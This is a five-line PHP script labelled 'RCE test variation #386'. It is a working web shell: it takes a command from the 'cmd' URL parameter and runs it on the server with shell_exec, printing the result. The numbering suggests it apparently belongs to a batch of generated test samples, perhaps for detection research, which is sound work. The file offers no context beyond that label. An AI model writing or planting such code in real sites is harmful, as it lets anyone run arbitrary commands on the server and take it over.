<?php
// RCE test variation #386
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>